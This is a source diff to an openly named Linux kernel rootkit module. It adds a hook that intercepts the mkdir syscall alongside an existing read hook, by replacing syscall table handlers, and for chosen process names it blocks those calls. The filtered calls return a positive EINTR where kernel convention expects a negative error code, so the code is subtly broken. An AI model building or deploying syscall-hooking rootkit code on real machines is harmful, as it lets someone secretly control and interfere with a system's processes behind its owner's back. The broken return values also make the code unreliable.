@@ -1,8 +1,10 @@
 #include "rootkit.h"
 
 #include <asm/syscall.h>
+#include <asm/unistd.h>
 #include <linux/cdev.h>
 #include <linux/dirent.h>
+#include <linux/errno.h>
 #include <linux/fs.h>
 #include <linux/kprobes.h>
 #include <linux/module.h>
@@ -45,7 +47,7 @@ static asmlinkage long my_sys_read(const struct pt_regs *regs) {
   list_for_each_entry(pos, &filter_list.list, list) {
     if (strcmp(pos->comm, current->comm) == 0 && pos->syscall_nr == __NR_read) {
       pr_info("Filtering read syscall for process %s\n", pos->comm);
-      return -ERRFILTER;
+      return EINTR;
     }
   }
 
@@ -54,6 +56,30 @@ static asmlinkage long my_sys_read(const struct pt_regs *regs) {
   } else {
     list_for_each_entry(pos, &filter_list.list, list) {
       if (pos->syscall_nr == __NR_read) {
+        syscall_fn_t orig_syscall = (syscall_fn_t)pos->orig_handler_addr;
+        return orig_syscall(regs);
+      }
+    }
+  }
+  return 0; // should never reach here
+}
+
+static asmlinkage long my_sys_mkdir(const struct pt_regs *regs) {
+  pr_warn("my_sys_mkdir\n");
+  struct filter_info *pos;
+  list_for_each_entry(pos, &filter_list.list, list) {
+    if (strcmp(pos->comm, current->comm) == 0 &&
+        pos->syscall_nr == __NR_mkdir) {
+      pr_info("Filtering mkdir syscall for process %s\n", pos->comm);
+      return EINTR;
+    }
+  }
+
+  if (total_references[__NR_mkdir] == 0) {
+    return sys_call_table_p[__NR_mkdir](regs);
+  } else {
+    list_for_each_entry(pos, &filter_list.list, list) {
+      if (pos->syscall_nr == __NR_mkdir) {
         syscall_fn_t orig_syscall = (syscall_fn_t)pos->orig_handler_addr;
         return orig_syscall(regs);
       }
@@ -258,6 +284,7 @@ static int __init rootkit_init(void) {
 
   // hook syscalls
   custom_handlers[__NR_read] = my_sys_read;
+  custom_handlers[__NR_mkdir] = my_sys_mkdir;
 
   return 0;
 }
